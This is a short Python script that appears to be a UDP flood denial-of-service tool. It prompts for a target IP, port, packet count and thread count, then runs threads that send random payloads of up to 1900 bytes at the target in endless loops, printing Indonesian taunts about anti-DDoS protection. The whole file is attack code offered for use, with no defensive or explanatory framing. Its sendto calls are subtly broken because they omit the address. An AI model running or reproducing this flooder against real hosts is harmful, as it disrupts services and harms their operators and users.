import random
import socket
import threading
import os,sys

os.system("clear")
print("
░█████╗░░██████╗███████╗██████╗░░█████╗░
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗
███████║╚█████╗░█████╗░░██████╔╝╚═╝███╔╝
██╔══██║░╚═══██╗██╔══╝░░██╔═══╝░░░░╚══╝░
██║░░██║██████╔╝███████╗██║░░░░░░░░██╗░░
╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░░░░░░░╚═╝░░")

p1 = str(input("•Ip  : "))
p2 = int(input("•Port  : "))
p3 = int(input("•Packet : "))
p4 = int(input("•Threads : "))
os.system("clear")
def titid():
    pepek = random._urandom(1180)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("PAKE ANTI DDOS BANH")
        except:
            print("ANTI DDOS?")

def titid2():
    pepek = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("PAKE ANTI DDOS BANH")
        except:
            print("ANTI DDOS?")

def titid3():
    pepek = random._urandom(1900)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("PAKE ANTI DDOS BANH")
        except:
            print("ANTI DDOS?")
            
for y in range(p4):
    th = threading.Thread(target=titid)
    th.start()
    th = threading.Thread(target=titid2)
    th.start()
    th = threading.Thread(target=titid3)
    th.start() 
